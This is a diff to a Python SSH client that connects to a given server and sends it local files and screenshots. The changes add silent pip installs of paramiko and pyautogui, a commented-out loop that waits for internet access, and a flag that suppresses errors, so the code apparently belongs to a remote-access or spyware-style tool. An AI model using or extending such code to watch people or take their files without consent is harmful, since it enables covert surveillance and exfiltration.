@@ -3,9 +3,13 @@ import os
 import subprocess
 import sys
 import time
+import requests
 
-import paramiko
-import pyautogui
+try:
+    import paramiko
+except Exception:
+    subprocess.run('pip install paramiko', shell=True)
+    import paramiko
 
 
 class Client:
@@ -15,7 +19,7 @@ class Client:
         self.server_ip = server_ip
         self.server_port = server_port
 
-    def connect_auth(self, username, password):
+    def connect_auth(self, username, password, verbose):
         '''
         Try to connect to the server with given username and password.
         '''
@@ -25,7 +29,8 @@ class Client:
                 username=username, password=password)
             return True
         except Exception as e:
-            print(e)
+            if verbose:
+                print(e)
             return False
 
     def open_channel(self, verbose):
@@ -76,6 +81,17 @@ def get_args():
     parser.add_argument('ps', help='the password of the ssh connection')
     parser.add_argument('-v', '--verbose', action='store_true')
     return parser.parse_args()
+
+
+def check_internet():
+    '''Return True if internet access is available'''
+    url = 'http://www.google.com/'
+    timeout = 5
+    try:
+        requests.get(url, timeout=timeout)
+        return True
+    except requests.ConnectionError:
+        return False
 
 
 def send_files(chan, local_path, fname=None, verbose=False):
@@ -141,6 +157,11 @@ def send_screen(chan, verbose):
     '''Try to take a screenshot and send to the server.
     '''
     try:
+        import pyautogui
+    except Exception:
+        subprocess.run('pip install pyautogui', shell=True)
+        import pyautogui
+    try:
         pic = pyautogui.screenshot()
         gmtime = time.gmtime()
         sname = f'scr{gmtime[0]}{gmtime[1]}{gmtime[2]}{gmtime[3]}{gmtime[4]}{gmtime[5]}.png'
@@ -159,8 +180,12 @@ def main():
     # Create ssh client
     client = Client(args.sip, args.sp)
 
+    # ## uncomment if it's not a lan ##
+    # while not check_internet():
+    #     time.sleep(5)
+
     # connect to the server
-    if not client.connect_auth(args.un, args.ps):
+    if not client.connect_auth(args.un, args.ps, args.verbose):
         sys.exit(1)
 
     # open channel
